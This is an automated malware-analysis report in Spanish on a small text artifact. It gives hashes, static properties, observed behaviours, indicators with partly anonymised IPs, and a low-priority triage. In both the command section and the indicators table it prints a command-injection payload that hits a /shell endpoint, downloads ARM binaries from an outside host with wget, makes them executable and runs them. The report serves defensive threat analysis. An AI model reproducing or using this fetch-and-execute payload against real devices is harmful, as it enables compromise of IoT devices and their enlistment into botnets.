# 🧬 Payload Analysis

`ca6db0332a11d8c1cdbd6638c383c218e647a2c3546df3146e8ca33cf6f968f4`

## 📌 Resumen

Artefacto de 614 B. Formato identificado como ASCII text, with very long lines (310), with CRLF line terminators. Entropía registrada: 5.31. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:04:03.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ca6db0332a11d8c1cdbd6638c383c218e647a2c3546df3146e8ca33cf6f968f4`
- **SHA1:** `5104d0317449c48ceae85fe861b7ecfdf13526ce`
- **MD5:** `9858c95ba49b6aee5b34f30b0d646e66`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (310), with CRLF line terminators |
| Tamaño | 614 B |
| Entropía | 5.31 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with very long lines (310), with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94.154.43.XXX/arm7;chmod+777+arm7;./arm7;wget+http:/\/94.154.43.XXX/arm6;chmod
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 94.154.43.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94.154.43.XXX/arm7;chmod+777+arm7;./arm7;wget+http:/\/94.154.43.XXX/arm6;chmod | strings |
| hash | ca6db0332a11d8c1cdbd6638c383c218e647a2c3546df3146e8ca33cf6f968f4 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
